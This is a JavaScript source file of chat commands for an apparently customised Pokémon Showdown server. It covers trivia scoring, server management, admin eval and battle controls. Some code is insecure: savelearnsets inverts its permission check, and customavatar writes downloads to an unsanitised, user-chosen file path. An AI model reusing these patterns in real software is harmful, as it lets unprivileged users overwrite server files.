		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to remove merits, points, or demerits.');
		if (!target) return this.sendReply('Subtract a merit by typing: /submerit [username].');
		
		var targetUser = Users.get(target);
		if (!targetUser) return this.sendReply('User '+target+' not found.');
		target = targetUser.name;
		
		this.add('|raw|<b>' + target + ' has had one merit removed by ' + user.name + '!</b>');
		
		//mySQL initialize database
		//var sys = require('util');
		var mysql = require('mysql');
		var myconnection = mysql.createConnection({
				'host': 'localhost','user':mysqlName,'password':mysqlPass
			}
		);
		
		myconnection.connect();
		myconnection.query('USE trivia');	
		
		//mySQL function
		myconnection.query(
			'CALL sub_merit (?)',
			[target],
			function(err, result) {
				if(err) {
					console.log(err);
					return;
				} else {
					console.log('Merit taken from user!');
				}
			}
		);
		myconnection.end();
		return false;		
	},
	
		// /subdemerit will remove one demerit!
	subdemerit: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to remove merits, points, or demerits.');
		if (!target) return this.sendReply('Subtract a demerit by typing: /subdemerit [username].');
		
		var targetUser = Users.get(target);
		if (!targetUser) return this.sendReply('User '+target+' not found.');
		target = targetUser.name;
		
		this.add('|raw|<b>' + target + ' has had one demerit removed by ' + user.name + '!</b>');
		
		//mySQL initialize database
		//var sys = require('util');
		var mysql = require('mysql');
		var myconnection = mysql.createConnection({
				'host': 'localhost','user':mysqlName,'password':mysqlPass
			}
		);
		
		myconnection.connect();
		myconnection.query('USE trivia');	
		
		//mySQL function
		myconnection.query(
			'CALL sub_demerit (?)',
			[target],
			function(err, result) {
				if(err) {
					console.log(err);
					return;
				} else {
					console.log('Demerit taken from user!');
				}
			}
		);
		myconnection.end();
		return false;		
	},
	
	// /subpoint will remove one point!
	subpoint: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to remove merits, points, or demerits.');
		if (!target) return this.sendReply('Subtract a point by typing: /subpoint [username].');
		
		var targetUser = Users.get(target);
		if (!targetUser) return this.sendReply('User '+target+' not found.');
		target = targetUser.name;
		
		this.add('|raw|<b>' + target + ' has had one point removed by ' + user.name + '!</b>');
		
		//mySQL initialize database
		//var sys = require('util');
		var mysql = require('mysql');
		var myconnection = mysql.createConnection({
				'host': 'localhost','user':mysqlName,'password':mysqlPass
			}
		);
		
		myconnection.connect();
		myconnection.query('USE trivia');	
		
		//mySQL function
		myconnection.query(
			'CALL sub_point (?)',
			[target],
			function(err, result) {
				if(err) {
					console.log(err);
					return;
				} else {
					console.log('Point taken from user!');
				}
			}
		);
		myconnection.end();
		return false;		
	},
	
	// /subpoint will remove one point!
	resettriviastats: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!user.can('declare')) return this.sendReply('You need to be an administrator (&) or above to reset a user\'s trivia stats.');
		if (!target) return this.sendReply('Reset all stats by typing: /resettriviastats [username].');
		
		var targetUser = Users.get(target);
		if (!targetUser) return this.sendReply('User '+target+' not found.');
		target = targetUser.name;
		
		this.add('|raw|<b>' + target + ' has had their trivia points, merits, and demerits set to 0 by ' + user.name + '!</b>');
		
		//mySQL initialize database
		//var sys = require('util');
		var mysql = require('mysql');
		var myconnection = mysql.createConnection({
				'host': 'localhost','user':mysqlName,'password':mysqlPass
			}
		);
		
		myconnection.connect();
		myconnection.query('USE trivia');	
		
		//mySQL function
		myconnection.query(
			'CALL reset_stats (?)',
			[target],
			function(err, result) {
				if(err) {
					console.log(err);
					return;
				} else {
					console.log('Stats reset!');
				}
			}
		);
		myconnection.end();
		return false;		
	},
	
	// /trivia will display all trivia commands!  Announcable, too.
	trivia: function(target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('<b>Trivia Commands (only usable in the Trivia chatroom!):</b><br>' +
							'<u><i>Regular user commands:</i></u><br>' +
							'<i> - /host -</i> Display information on the current trivia host--how many questions they have left along with their score, merits, and demerits. <br>' +
							'<i> - /score [username] -</i> Display score information on a user. If there is no target, it will display your scores.<br>' +
							'<i> - /trivia -</i> Displays this help information.<br>' +
							'<i> - /queue -</i> Displays the current queue of hosts.<br>' +
							'<i> - /cq -</i> Displays the current question.<br><br>' +
							'<u><i>Voiced user commands:</i></u><br>' +
							'<i> - /merit [reason] - /demerit [reason]-</i> Give the current host one merit or one demerit. To give a demerit, you must provide a reason for the demerit.<br><br>' +
							'<u><i>Trivia Host commands:</i></u><br>Special note: a host is a temporary position that can be given to one user at a time.<br>If you want to be a trivia host, just ask!' +
							'<i> - /ask [question] -</i> Asks the chat the question you write.   <br>' +
							'<i> - /answer [username], [answer] -</i> Displays the correct answer and gives one point to the specified user.   <br>' +
							'<i> - /cancel [answer] -</i> This command will cancel the current question, and will not give any points to any users.<br><br>' +
							'<u><i>Driver commands (% and above):</i></u><br>'+
							'<i> - /starttrivia -</i> Sends a trivia invite to the lobby and creates a trivia room, if there isn\'t one already.<br>' +
							'<i> - /newhost [username] -</i> Set any person as the new host, with ten questions.<br>' +
							'<i> - /dehost -</i> Removes the current host.<br>' +
							'<i> - /changetotal # -</i> Changes the number of remaining questions for the current host.  Use negative numbers to subtract.  Useful for extending or reducing durations.<br>' +
							'<i> - /submerit [username] - /subdemerit [username] - /subpoint [username] -</i> Removes one point, merit or demerit from a target user.  Useful if someone makes a mistake.<br>' +
							'<i> - /addqueue [username]-</i> Adds a user to the queue of hosts.  They will automatically be assigned host, in order.<br>' +
							'<i> - /rmqueue [username]-</i> Removes a single user from all spots in a queue.<br>' +
							'<i> - /clearqueue [username]-</i> Clears the queue completely.<br><br>' +
							'<u><i>Administrative commands (& and above):</i></u><br>'+
							'<i> - /resettriviastats [username] -</i> Resets all points, merits, and demerits from a target user.'
		);
	},*/

	/*********************************************************
	 * Server management commands
	 *********************************************************/

	hotpatch: function(target, room, user) {
		if (!target) return this.parse('/help hotpatch');
		if (!this.can('hotpatch')) return false;

		this.logEntry(user.name + ' used /hotpatch ' + target);

		if (target === 'chat') {

			try {
				CommandParser.uncacheTree('./command-parser.js');
				CommandParser = require('./command-parser.js');
				return this.sendReply('Chat commands have been hot-patched.');
			} catch (e) {
				return this.sendReply('Something failed while trying to hotpatch chat: \n' + e.stack);
			}

		} else if (target === 'battles') {

			Simulator.SimulatorProcess.respawn();
			return this.sendReply('Battles have been hotpatched. Any battles started after now will use the new code; however, in-progress battles will continue to use the old code.');

		} else if (target === 'formats') {
			try {
				// uncache the tools.js dependency tree
				CommandParser.uncacheTree('./tools.js');
				// reload tools.js
				Tools = require('./tools.js'); // note: this will lock up the server for a few seconds
				// rebuild the formats list
				Rooms.global.formatListText = Rooms.global.getFormatListText();
				// respawn simulator processes
				Simulator.SimulatorProcess.respawn();
				// broadcast the new formats list to clients
				Rooms.global.send(Rooms.global.formatListText);

				return this.sendReply('Formats have been hotpatched.');
			} catch (e) {
				return this.sendReply('Something failed while trying to hotpatch formats: \n' + e.stack);
			}

		}
		this.sendReply('Your hot-patch command was unrecognized.');
	},

	hide: function(target, room, user) {
		if (this.can('hide')) {
			user.getIdentity = function(){
				if(this.muted)	return '!' + this.name;
				if(this.locked) return '‽' + this.name;
				return ' ' + this.name;
			};
			user.updateIdentity();
			this.sendReply('You have hidden your staff symbol.');
			return false;
		}

	},

	show: function(target, room, user) {
		if (this.can('hide')) {
			delete user.getIdentity
			user.updateIdentity();
			this.sendReply('You have revealed your staff symbol');
			return false;
		}
	},

	customavatar: function(target, room, user, connection) {
		if (!this.can('customavatars')) return false;
		if (!target) return connection.sendTo(room, 'Usage: /customavatar URL, filename');
		var http = require('http-get');
		target = target.split(", ");
		http.get(target[0], 'config/avatars/' + target[1], function (error, result) {
		    if (error) {
    		    connection.sendTo(room, '/customavatar - You supplied an invalid URL or file name!');
    		} else {
	    	    connection.sendTo(room, 'File saved to: ' + result.file);
	    	}
		});
	},

	showuserid: function(target, room, user) {
		if (!target) return this.parse('/getid [username] - To get the raw id of the user');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		if (!this.can('lock')) return false;

		this.sendReply('The ID of the target is: ' + targetUser);
	},

	uui: 'userupdate',
	userupdate: function(target, room, user) {
		if (!target) return this.sendReply('/userupdate [username] OR /uui [username] - Updates the user identity fixing the users shown group.');
		if (!this.can('hotpatch')) return false;

		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		targetUser.updateIdentity();

		this.sendReply(targetUser + '\'s identity has been updated.');
	},

	usersofrank: function(target, room, user) {
		if (!target) return false;
		var name = '';

		for (var i in room.users){
			if (room.users[i].group === target) {
				name = name + room.users[i].name + ', ';
			}
		}
		if (!name) return this.sendReply('There are no users of the rank ' + target + ' in this room.');

		this.sendReply('Users of rank ' + target + ' in this room:');
		this.sendReply(name);
	},

	masspm: 'pmall',
	pmall: function(target, room, user) {
		if (!target) return this.parse('/pmall [message] - Sends a PM to every user in a room.');
		if (!this.can('hotpatch')) return false;

		var pmName = '~Frost PM [Do not reply]';

		for (var i in room.users) {
			var message = '|pm|'+pmName+'|'+room.users[i].getIdentity()+'|'+target;
			room.users[i].send(message);
		}
	},

	savelearnsets: function(target, room, user) {
		if (this.can('hotpatch')) return false;
		fs.writeFile('data/learnsets.js', 'exports.BattleLearnsets = '+JSON.stringify(BattleLearnsets)+";\n");
		this.sendReply('learnsets.js saved.');
	},

	disableladder: function(target, room, user) {
		if (!this.can('disableladder')) return false;
		if (LoginServer.disabled) {
			return this.sendReply('/disableladder - Ladder is already disabled.');
		}
		LoginServer.disabled = true;
		this.logModCommand('The ladder was disabled by ' + user.name + '.');
		this.add('|raw|<div class="broadcast-red"><b>Due to high server load, the ladder has been temporarily disabled</b><br />Rated games will no longer update the ladder. It will be back momentarily.</div>');
	},

	enableladder: function(target, room, user) {
		if (!this.can('disableladder')) return false;
		if (!LoginServer.disabled) {
			return this.sendReply('/enable - Ladder is already enabled.');
		}
		LoginServer.disabled = false;
		this.logModCommand('The ladder was enabled by ' + user.name + '.');
		this.add('|raw|<div class="broadcast-green"><b>The ladder is now back.</b><br />Rated games will update the ladder now.</div>');
	},

	lockdown: function(target, room, user) {
		if (!this.can('lockdown')) return false;

		Rooms.global.lockdown = true;
		for (var id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-red"><b>The server is restarting soon.</b><br />Please finish your battles quickly. No new battles can be started until the server resets in a few minutes.</div>');
			if (Rooms.rooms[id].requestKickInactive && !Rooms.rooms[id].battle.ended) Rooms.rooms[id].requestKickInactive(user, true);
		}

		this.logEntry(user.name + ' used /lockdown');

	},

	endlockdown: function(target, room, user) {
		if (!this.can('lockdown')) return false;

		if (!Rooms.global.lockdown) {
			return this.sendReply("We're not under lockdown right now.");
		}
		Rooms.global.lockdown = false;
		for (var id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-green"><b>The server shutdown was canceled.</b></div>');
		}

		this.logEntry(user.name + ' used /endlockdown');

	},

	emergency: function(target, room, user) {
		if (!this.can('lockdown')) return false;

		if (config.emergency) {
			return this.sendReply("We're already in emergency mode.");
		}
		config.emergency = true;
		for (var id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-red">The server has entered emergency mode. Some features might be disabled or limited.</div>');
		}

		this.logEntry(user.name + ' used /emergency');
	},

	endemergency: function(target, room, user) {
		if (!this.can('lockdown')) return false;

		if (!config.emergency) {
			return this.sendReply("We're not in emergency mode.");
		}
		config.emergency = false;
		for (var id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-green"><b>The server is no longer in emergency mode.</b></div>');
		}

		this.logEntry(user.name + ' used /endemergency');
	},

	kill: function(target, room, user) {
		if (!this.can('lockdown')) return false;

		if (!Rooms.global.lockdown) {
			return this.sendReply('For safety reasons, /kill can only be used during lockdown.');
		}

		if (CommandParser.updateServerLock) {
			return this.sendReply('Wait for /updateserver to finish before using /kill.');
		}

		room.destroyLog(function() {
			room.logEntry(user.name + ' used /kill');
		}, function() {
			process.exit();
		});

		// Just in the case the above never terminates, kill the process
		// after 10 seconds.
		setTimeout(function() {
			process.exit();
		}, 10000);
	},

	restart: function(target, room, user) {
		if (!this.can('lockdown')) return false;

		if (!Rooms.global.lockdown) {
			return this.sendReply('For safety reasons, /restart can only be used during lockdown.');
		}

		if (CommandParser.updateServerLock) {
			return this.sendReply('Wait for /updateserver to finish before using /kill.');
		}
		var exec = require('child_process').exec;
		exec('./restart.sh');
		Rooms.global.send('|refresh|');
	},

	loadbanlist: function(target, room, user, connection) {
		if (!this.can('hotpatch')) return false;

		connection.sendTo(room, 'Loading ipbans.txt...');
		fs.readFile('config/ipbans.txt', function (err, data) {
			if (err) return;
			data = (''+data).split("\n");
			var count = 0;
			for (var i=0; i<data.length; i++) {
				data[i] = data[i].split('#')[0].trim();
				if (data[i] && !Users.bannedIps[data[i]]) {
					Users.bannedIps[data[i]] = '#ipban';
					count++;
				}
			}
			if (!count) {
				connection.sendTo(room, 'No IPs were banned; ipbans.txt has not been updated since the last time /loadbanlist was called.');
			} else {
				connection.sendTo(room, ''+count+' IPs were loaded from ipbans.txt and banned.');
			}
		});
	},

	refreshpage: function(target, room, user) {
		if (!this.can('hotpatch')) return false;
		Rooms.global.send('|refresh|');
		this.logEntry(user.name + ' used /refreshpage');
	},

	updateserver: function(target, room, user, connection) {
		if (!user.checkConsolePermission(connection)) {
			return this.sendReply('/updateserver - Access denied.');
		}

		if (CommandParser.updateServerLock) {
			return this.sendReply('/updateserver - Another update is already in progress. [This maybe a bug, and will require restart].');
		}

		CommandParser.updateServerLock = true;

		var logQueue = [];
		logQueue.push(user.name + ' used /updateserver');

		connection.sendTo(room, 'updating...');

		var exec = require('child_process').exec;
		exec('git diff-index --quiet HEAD --', function(error) {
			var cmd = 'git pull --rebase';
			if (error) {
				if (error.code === 1) {
					// The working directory or index have local changes.
					cmd = 'git stash;' + cmd + ';git stash pop';
				} else {
					// The most likely case here is that the user does not have
					// `git` on the PATH (which would be error.code === 127).
					connection.sendTo(room, '' + error);
					logQueue.push('' + error);
					logQueue.forEach(function(line) {
						room.logEntry(line);
					});
					CommandParser.updateServerLock = false;
					return;
				}
			}
			var entry = 'Running `' + cmd + '`';
			connection.sendTo(room, entry);
			logQueue.push(entry);
			exec(cmd, function(error, stdout, stderr) {
				('' + stdout + stderr).split('\n').forEach(function(s) {
					connection.sendTo(room, s);
					logQueue.push(s);
				});
				logQueue.forEach(function(line) {
					room.logEntry(line);
				});
				CommandParser.updateServerLock = false;
			});
		});
	},

	crashfixed: function(target, room, user) {
		if (!Rooms.global.lockdown) {
			return this.sendReply('/crashfixed - There is no active crash.');
		}
		if (!this.can('hotpatch')) return false;

		Rooms.global.lockdown = false;
		if (Rooms.lobby) {
			Rooms.lobby.modchat = false;
			Rooms.lobby.addRaw('<div class="broadcast-green"><b>We fixed the crash without restarting the server!</b><br />You may resume talking in the lobby and starting new battles.</div>');
		}
		this.logEntry(user.name + ' used /crashfixed');
	},

	crashlogged: function(target, room, user) {
		if (!Rooms.global.lockdown) {
			return this.sendReply('/crashlogged - There is no active crash.');
		}
		if (!this.can('declare')) return false;

		Rooms.global.lockdown = false;
		if (Rooms.lobby) {
			Rooms.lobby.modchat = false;
			Rooms.lobby.addRaw('<div class="broadcast-green"><b>We have logged the crash and are working on fixing it!</b><br />You may resume talking in the lobby and starting new battles.</div>');
		}
		this.logEntry(user.name + ' used /crashlogged');
	},

	'memusage': 'memoryusage',
	memoryusage: function(target) {
		if (!this.can('hotpatch')) return false;
		target = toId(target) || 'all';
		if (target === 'all') {
			this.sendReply('Loading memory usage, this might take a while.');
		}
		if (target === 'all' || target === 'rooms' || target === 'room') {
			this.sendReply('Calcualting Room size...');
			var roomSize = ResourceMonitor.sizeOfObject(Rooms);
			this.sendReply("Rooms are using " + roomSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'config') {
			this.sendReply('Calculating config size...');
			var configSize = ResourceMonitor.sizeOfObject(config);
			this.sendReply("Config is using " + configSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'resourcemonitor' || target === 'rm') {
			this.sendReply('Calculating Resource Monitor size...');
			var rmSize = ResourceMonitor.sizeOfObject(ResourceMonitor);
			this.sendReply("The Resource Monitor is using " + rmSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'apps' || target === 'app' || target === 'serverapps') {
			this.sendReply('Calculating Server Apps size...');
			var appSize = ResourceMonitor.sizeOfObject(App) + ResourceMonitor.sizeOfObject(AppSSL) + ResourceMonitor.sizeOfObject(Server);
			this.sendReply("Server Apps are using " + appSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'cmdp' || target === 'cp' || target === 'commandparser') {
			this.sendReply('Calculating Command Parser size...');
			var cpSize = ResourceMonitor.sizeOfObject(CommandParser);
			this.sendReply("Command Parser is using " + cpSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'sim' || target === 'simulator') {
			this.sendReply('Calculating Simulator size...');
			var simSize = ResourceMonitor.sizeOfObject(Simulator);
			this.sendReply("Simulator is using " + simSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'users') {
			this.sendReply('Calculating Users size...');
			var usersSize = ResourceMonitor.sizeOfObject(Users);
			this.sendReply("Users is using " + usersSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'tools') {
			this.sendReply('Calculating Tools size...');
			var toolsSize = ResourceMonitor.sizeOfObject(Tools);
			this.sendReply("Tools are using " + toolsSize + " bytes of memory.");
		}
		if (target === 'all') {
			this.sendReply('Calculating Total size...');
			var total = (roomSize + configSize + rmSize + appSize + cpSize + simSize + toolsSize + usersSize) || 0;
			var units = ['bytes', 'K', 'M', 'G'];
			var converted = total;
			var unit = 0;
			while (converted > 1024) {
				converted /= 1024;
				unit++;
			}
			converted = Math.round(converted);
			this.sendReply("Total memory used: " + converted + units[unit] + " (" + total + " bytes).");
		}
		return;
	},

	eval: function(target, room, user, connection, cmd, message) {
		if (!user.checkConsolePermission(connection)) {
			return this.sendReply("/eval - Access denied.");
		}
		if (!this.canBroadcast()) return;

		if (!this.broadcasting) this.sendReply('||>> '+target);
		try {
			var battle = room.battle;
			var me = user;
			this.sendReply('||<< '+eval(target));
		} catch (e) {
			this.sendReply('||<< error: '+e.message);
			var stack = '||'+(''+e.stack).replace(/\n/g,'\n||');
			connection.sendTo(room, stack);
		}
	},

	evalbattle: function(target, room, user, connection, cmd, message) {
		if (!user.checkConsolePermission(connection)) {
			return this.sendReply("/evalbattle - Access denied.");
		}
		if (!this.canBroadcast()) return;
		if (!room.battle) {
			return this.sendReply("/evalbattle - This isn't a battle room.");
		}

		room.battle.send('eval', target.replace(/\n/g, '\f'));
	},

	/*********************************************************
	 * Battle commands
	 *********************************************************/

	concede: 'forfeit',
	surrender: 'forfeit',
	forfeit: function(target, room, user) {
		if (!room.battle) {
			return this.sendReply("There's nothing to forfeit here.");
		}
		if (!room.forfeit(user)) {
			return this.sendReply("You can't forfeit this battle.");
		}
	},

	savereplay: function(target, room, user, connection) {
		if (!room || !room.battle) return;
		var logidx = 2; // spectator log (no exact HP)
		if (room.battle.ended) {
			// If the battle is finished when /savereplay is used, include
			// exact HP in the replay log.
			logidx = 3;
		}
		var data = room.getLog(logidx).join("\n");
		var datahash = crypto.createHash('md5').update(data.replace(/[^(\x20-\x7F)]+/g,'')).digest('hex');

		LoginServer.request('prepreplay', {
			id: room.id.substr(7),
			loghash: datahash,
			p1: room.p1.name,
			p2: room.p2.name,
			format: room.format
		}, function(success) {
			connection.send('|queryresponse|savereplay|'+JSON.stringify({
				log: data,
				id: room.id.substr(7)
			}));
		});
	},

	mv: 'move',
	attack: 'move',
	move: function(target, room, user) {
		if (!room.decision) return this.sendReply('You can only do this in battle rooms.');

		room.decision(user, 'choose', 'move '+target);
	},

	sw: 'switch',
	switch: function(target, room, user) {
		if (!room.decision) return this.sendReply('You can only do this in battle rooms.');

		room.decision(user, 'choose', 'switch '+parseInt(target,10));
	},

	choose: function(target, room, user) {
		if (!room.decision) return this.sendReply('You can only do this in battle rooms.');

		room.decision(user, 'choose', target);
	},

	undo: function(target, room, user) {
		if (!room.decision) return this.sendReply('You can only do this in battle rooms.');

		room.decision(user, 'undo', target);
	},

	team: function(target, room, user) {
		if (!room.decision) return this.sendReply('You can only do this in battle rooms.');

		room.decision(user, 'choose', 'team '+target);
	},

	joinbattle: function(target, room, user) {
		if (!room.joinBattle) return this.sendReply('You can only do this in battle rooms.');

		room.joinBattle(user);
	},

	partbattle: 'leavebattle',
	leavebattle: function(target, room, user) {
		if (!room.leaveBattle) return this.sendReply('You can only do this in battle rooms.');

		room.leaveBattle(user);
	},

	kickbattle: function(target, room, user) {
		if (!room.leaveBattle) return this.sendReply('You can only do this in battle rooms.');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!this.can('kick', targetUser)) return false;

		if (room.leaveBattle(targetUser)) {
			this.addModCommand(''+targetUser.name+' was kicked from a battle by '+user.name+'' + (target ? " (" + target + ")" : ""));
		} else {
			this.sendReply("/kickbattle - User isn\'t in battle.");
		}
	},

	kickinactive: function(target, room, user) {
		if (room.requestKickInactive) {
			room.requestKickInactive(user);
		} else {
			this.sendReply('You can only kick inactive players from inside a room.');
		}
	},

	timer: function(target, room, user) {
		target = toId(target);
		if (room.requestKickInactive) {
			if (target === 'off' || target === 'stop') {
				room.stopKickInactive(user, user.can('timer'));
			} else if (target === 'on' || !target) {
				room.requestKickInactive(user, user.can('timer'));
			} else {
				this.sendReply("'"+target+"' is not a recognized timer state.");
			}
		} else {
			this.sendReply('You can only set the timer from inside a room.');
		}
	},

	forcetie: 'forcewin',
	forcewin: function(target, room, user) {
		if (!this.can('forcewin')) return false;
		if (!room.battle) {
			this.sendReply('/forcewin - This is not a battle room.');
			return false;
		}

		room.battle.endType = 'forced';
		if (!target) {
			room.battle.tie();
			this.logModCommand(user.name+' forced a tie.');
			return false;
		}
		target = Users.get(target);
		if (target) target = target.userid;
		else target = '';

		if (target) {
			room.battle.win(target);
			this.logModCommand(user.name+' forced a win for '+target+'.');
		}

	},

	/*********************************************************
	 * Challenging and searching commands
	 *********************************************************/

	cancelsearch: 'search',
	search: function(target, room, user) {
		if (target) {
			Rooms.global.searchBattle(user, target);
		} else {
			Rooms.global.cancelSearch(user);
		}
	},

	chall: 'challenge',
	challenge: function(target, room, user, connection) {
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.popupReply("The user '"+this.targetUsername+"' was not found.");
		}
		if (targetUser.blockChallenges && !user.can('bypassblocks', targetUser)) {
			return this.popupReply("The user '"+this.targetUsername+"' is not accepting challenges right now.");
		}
		if (!user.prepBattle(target, 'challenge', connection)) return;
		user.makeChallenge(targetUser, target);
	},

	away: 'blockchallenges',
	idle: 'blockchallenges',
	blockchallenges: function(target, room, user) {
		user.blockChallenges = true;
		this.sendReply('You are now blocking all incoming challenge requests.');
	},

	back: 'allowchallenges',
	allowchallenges: function(target, room, user) {
		user.blockChallenges = false;
		this.sendReply('You are available for challenges from now on.');
	},

	cchall: 'cancelChallenge',
	cancelchallenge: function(target, room, user) {
		user.cancelChallengeTo(target);
	},

	accept: function(target, room, user, connection) {
		var userid = toUserid(target);
		var format = '';
		if (user.challengesFrom[userid]) format = user.challengesFrom[userid].format;
		if (!format) {
			this.popupReply(target+" cancelled their challenge before you could accept it.");
			return false;
		}
		if (!user.prepBattle(format, 'challenge', connection)) return;
		user.acceptChallengeFrom(userid);
	},

	reject: function(target, room, user) {
		user.rejectChallengeFrom(toUserid(target));
	},

	saveteam: 'useteam',
	utm: 'useteam',
	useteam: function(target, room, user) {
		try {
			user.team = JSON.parse(target);
		} catch (e) {
			this.popupReply('Not a valid team.');
		}
	},

	/*********************************************************
	 * Low-level
	 *********************************************************/

	cmd: 'query',
	query: function(target, room, user, connection) {
		// Avoid guest users to use the cmd errors to ease the app-layer attacks in emergency mode
		var trustable = (!config.emergency || (user.named && user.authenticated));
		if (config.emergency && ResourceMonitor.countCmd(connection.ip, user.name)) return false;
		var spaceIndex = target.indexOf(' ');
		var cmd = target;
		if (spaceIndex > 0) {
			cmd = target.substr(0, spaceIndex);
			target = target.substr(spaceIndex+1);
		} else {
			target = '';
		}
		if (cmd === 'userdetails') {

			var targetUser = Users.get(target);
			if (!trustable || !targetUser) {
				connection.send('|queryresponse|userdetails|'+JSON.stringify({
					userid: toId(target),
					rooms: false
				}));
				return false;
			}
			var roomList = {};
			for (var i in targetUser.roomCount) {
				if (i==='global') continue;
				var targetRoom = Rooms.get(i);
				if (!targetRoom || targetRoom.isPrivate) continue;
				var roomData = {};
				if (targetRoom.battle) {
					var battle = targetRoom.battle;
					roomData.p1 = battle.p1?' '+battle.p1:'';
					roomData.p2 = battle.p2?' '+battle.p2:'';
				}
				roomList[i] = roomData;
			}
			if (!targetUser.roomCount['global']) roomList = false;
			var userdetails = {
				userid: targetUser.userid,
				avatar: targetUser.avatar,
				rooms: roomList
			};
			if (user.can('ip', targetUser)) {
				var ips = Object.keys(targetUser.ips);
				if (ips.length === 1) {
					userdetails.ip = ips[0];
				} else {
					userdetails.ips = ips;
				}
			}
			connection.send('|queryresponse|userdetails|'+JSON.stringify(userdetails));

		} else if (cmd === 'roomlist') {
			if (!trustable) return false;
			connection.send('|queryresponse|roomlist|'+JSON.stringify({
				rooms: Rooms.global.getRoomList(true)
			}));

		} else if (cmd === 'rooms') {
			if (!trustable) return false;
			connection.send('|queryresponse|rooms|'+JSON.stringify(
				Rooms.global.getRooms()
			));

		}
	},

	trn: function(target, room, user, connection) {
		var commaIndex = target.indexOf(',');
		var targetName = target;
		var targetAuth = false;
		var targetToken = '';
		if (commaIndex >= 0) {
			targetName = target.substr(0,commaIndex);
			target = target.substr(commaIndex+1);
			commaIndex = target.indexOf(',');
			targetAuth = target;
			if (commaIndex >= 0) {
				targetAuth = !!parseInt(target.substr(0,commaIndex),10);
				targetToken = target.substr(commaIndex+1);
			}
		}
		user.rename(targetName, targetToken, targetAuth, connection);
	},

};
